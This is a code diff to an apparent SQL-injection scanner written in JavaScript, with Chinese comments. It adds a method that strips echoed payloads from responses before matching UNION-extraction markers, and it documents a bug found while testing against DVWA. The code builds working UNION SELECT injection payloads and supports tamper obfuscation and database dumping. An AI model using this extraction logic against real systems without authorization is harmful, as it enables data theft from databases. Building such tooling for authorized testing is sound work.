@@ -9,6 +9,7 @@
 // 其余：2026-09-14 起 blindExtractor.js 是本文件盲注部分的**纯搬移**（`this` → 首参 `ex`）。
 // =====================================================================
 import { nullSequence } from './payloads.js';
+import { stripEchoedPayload } from './echoStrip.js';
 import { discoverEchoColumns, buildInjectionRequest } from './injection.js';
 import { binaryGuessColumns, colGuessExtra } from './columnGuess.js';
 import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
@@ -276,8 +277,31 @@ export class Extractor {
     // ★FIX-4 [P1] 原 payload 未拼 point.boundary（布尔/时间检测器均使用），字符串上下文
     // 注入点（如 WHERE name='...'）上 UNION 提取永不执行。修复：拼闭合前缀。
     const payload = `${point.originalValue || '1'}${point.boundary || ''} UNION SELECT ${cols}${fromDual}-- -`;
+    return this._markedValue(ctx, payload);
+  }
+
+  /**
+   * 发一次 UNION 提取请求，返回标记 `__S__..__E__` 之间的内容（未命中返回 null）。
+   * 独立成方法的原因：剥离回显 + 匹配标记这两步是「提取」区别于「检测」的关键，
+   * 且 2026-10-20 的提取缺陷就出在这一步（详见下方注释）—— 留给守卫与单测一个明确的锚点。
+   * @param {object} ctx 扫描上下文
+   * @param {string} payload 已拼好的 UNION payload（含闭合前缀与尾注释）
+   * @returns {Promise<string|null>}
+   */
+  async _markedValue(ctx, payload) {
     const res = await this._send(ctx, payload);
-    const body = String(res?.data ?? '');
+    const rawBody = String(res?.data ?? '');
+    // [D118 2026-10-20] **必须先剥掉「payload 回显」再找标记**。
+    // 反证（外部裁判 DVWA low，`vulnerabilities/sqli/source/low.php` 的
+    // `<pre>ID: {$id}...` 把用户输入原样回显）：
+    //   实测响应 = `ID: 1' UNION SELECT '__S__','__E__'-- -` + 结果行
+    //   ⇒ 未剥离时 `body.match(/__S__(.*?)__E__/)` 命中的是 **payload 自身**，
+    //     `m[1]` 拿到 `','`/`CAST((...` 之类的 payload 残片，
+    //     于是 `--dbs` 的 data.databases = ["'", "CAST((SELECT ...", "') ..."]（实测），
+    //     报告里「数据泄露实证」整块是错的 —— 比空更糟。
+    // 工具 `stripEchoedPayload` 早已存在（ErrorDetector / DBFingerprinter / blindExtractor
+    // 都在用，含 SQL 转义与 JSON 转义变体），**只有这条提取主路径没接**。
+    const body = stripEchoedPayload(rawBody, payload);
     // D6: 大小写不敏感匹配 —— lowercase/uppercase/mixedcase 等 tamper 会把字符串字面量
     // '__S__/__E__' 整体变小/大写，拖库/指纹/内联提取的标记匹配必须免疫（对标 sqlmap 标记稳定设计）
     const m = body.match(/__S__(.*?)__E__/is);
